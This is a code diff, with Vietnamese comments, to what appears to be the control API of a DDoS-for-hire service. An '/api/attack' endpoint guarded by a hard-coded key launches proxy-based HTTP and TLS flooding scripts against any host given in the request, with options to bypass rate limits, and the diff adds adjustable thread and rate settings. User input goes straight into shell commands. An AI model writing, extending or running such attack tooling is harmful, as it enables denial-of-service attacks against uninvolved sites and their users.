@@ -20,11 +20,13 @@ const getPublicIP = async () => {
 };
 
 // Kiểm tra dữ liệu đầu vào
-const validateInput = ({ key, host, time, method, port }) => {
-  if (![key, host, time, method, port].every(Boolean)) return "Thiếu tham số yêu cầu";
+const validateInput = ({ key, host, time, method, port, threads, rate }) => {
+  if (![key, host, time, method, port, threads, rate].every(Boolean)) return "Thiếu tham số yêu cầu";
   if (key !== "negan") return "Invalid Key";
   if (time > 300) return "Thời gian phải nhỏ hơn 300 giây";
   if (port < 1 || port > 65535) return "Cổng không hợp lệ";
+  if (threads < 1) return "Số luồng (threads) phải lớn hơn 0";
+  if (rate < 1) return "Tốc độ (rate) phải lớn hơn 0";
   if (!["flood", "killer", "bypass", "tlskill", "attack"].includes(method.toLowerCase())) {
     return "Phương thức không hợp lệ";
   }
@@ -81,10 +83,10 @@ const pkillProcesses = async () => {
 
 // API tấn công
 app.get("/api/attack", (req, res) => {
-  const { key, host, time, method, port } = req.query;
+  const { key, host, time, method, port, threads, rate } = req.query;
   const clientIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
 
-  const validationMessage = validateInput({ key, host, time, method, port });
+  const validationMessage = validateInput({ key, host, time, method, port, threads, rate });
   if (validationMessage) return res.status(400).json({ status: "error", message: validationMessage });
 
   if (activeAttacks >= maxConcurrentAttacks) {
@@ -99,7 +101,7 @@ app.get("/api/attack", (req, res) => {
     "killer": `node --max-old-space-size=65536 killer GET ${host} ${time} 10 10 live.txt`,
     "bypass": `node --max-old-space-size=65536 bypass ${host} ${time} 10 10 live.txt bypass --redirect true --ratelimit true --query true`,
     "tlskill": `node --max-old-space-size=65536 tlskill ${host} ${time} 10 10 live.txt --icecool true --dual true --brave true`,
-    "attack": `node --max-old-space-size=65536 attack -m GET -m POST -m HEAD -u ${host} -s ${time} -p live.txt -t 15 -r 333 --ratelimit true --full true`
+    "attack": `node --max-old-space-size=65536 attack -m ${method} -u ${host} -s ${time} -p live.txt -t ${threads} -r ${rate} --ratelimit true --full true`
   };
 
   const command = commands[method.toLowerCase()];
@@ -108,7 +110,7 @@ app.get("/api/attack", (req, res) => {
   }
 
   executeAttack(command, clientIP);
-  res.status(200).json({ status: "success", message: "Send Attack Successfully", host, port, time, method });
+  res.status(200).json({ status: "success", message: "Send Attack Successfully", host, port, time, method, threads, rate });
 });
 
 // API pkill
